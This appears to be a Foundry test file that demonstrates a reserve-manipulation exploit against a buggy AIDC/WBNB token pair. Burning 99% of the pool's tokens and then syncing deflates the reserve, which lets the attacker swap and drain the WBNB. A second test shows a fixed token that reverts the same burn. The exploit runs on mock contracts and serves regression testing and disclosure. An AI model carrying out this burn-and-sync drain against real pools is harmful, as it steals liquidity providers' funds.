// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "forge-std/Test.sol";
import {MockWBNB} from "../src/MockWBNB.sol";
import {Pair} from "../src/Pair.sol";
import {AidcTokenBuggy} from "../src/AidcTokenBuggy.sol";
import {AidcTokenFixed} from "../src/AidcTokenFixed.sol";

contract ReserveManipTest is Test {
    MockWBNB wbnb;
    address attacker = makeAddr("attacker");
    function setUp() public { wbnb = new MockWBNB(); }

    // OLD (buggy): burn AIDC from the POOL + sync -> deflate reserve -> drain WBNB.
    function test_drain() public {
        AidcTokenBuggy aidc = new AidcTokenBuggy();
        Pair pair = new Pair(address(aidc), address(wbnb));
        aidc.mint(address(pair), 1_000_000 ether);   // pool AIDC liquidity
        wbnb.mint(address(pair), 100 ether);         // pool WBNB liquidity
        pair.sync();
        aidc.mint(attacker, 10_000 ether);           // attacker's cheaply-held AIDC

        console.log("== AIDC: the burn hits the POOL, not the seller ==");
        console.log("1. pool reserves | WBNB:", pair.rWbnb()/1e18, " AIDC:", pair.rAidc()/1e18);
        console.log("2. attacker AIDC |", aidc.balanceOf(attacker)/1e18);

        vm.startPrank(attacker);
        aidc.executeAccumulatedBurn(address(pair), 990_000 ether);   // burn 99% of pool AIDC + sync
        console.log("3. after burn+sync -> WBNB:", pair.rWbnb()/1e18, " AIDC:", pair.rAidc()/1e18);
        uint256 got = pair.swapAidcForWbnb(10_000 ether);            // swap 10k AIDC at the faked price
        vm.stopPrank();

        console.log("4. attacker swapped 10,000 AIDC -> WBNB:", got/1e18);
        console.log("5. pool WBNB drained: 100 ->", wbnb.balanceOf(address(pair))/1e18);
        assertGt(got, 10 ether);   // pulled far more than the ~0.99 WBNB a fair swap would give
    }

    // FIXED: a burn can only debit the caller's own balance, and never touches sync().
    function test_fixed() public {
        AidcTokenFixed aidc = new AidcTokenFixed();
        Pair pair = new Pair(address(aidc), address(wbnb));
        aidc.mint(address(pair), 1_000_000 ether);
        wbnb.mint(address(pair), 100 ether);
        pair.sync();
        aidc.mint(attacker, 10_000 ether);

        console.log("== FIXED: a burn can only debit YOUR balance ==");
        console.log("1. pool reserves     | WBNB:", pair.rWbnb()/1e18, " AIDC:", pair.rAidc()/1e18);
        vm.prank(attacker);
        vm.expectRevert();                                           // can't burn 990k you don't hold
        aidc.executeAccumulatedBurn(address(pair), 990_000 ether);
        console.log("2. burn REVERTED -> reserves UNCHANGED:", pair.rWbnb()/1e18, " AIDC:", pair.rAidc()/1e18);
        assertEq(pair.rWbnb(), 100 ether);       // pool never deflated...
        assertEq(pair.rAidc(), 1_000_000 ether); // ...so there is no free WBNB to extract
    }
}
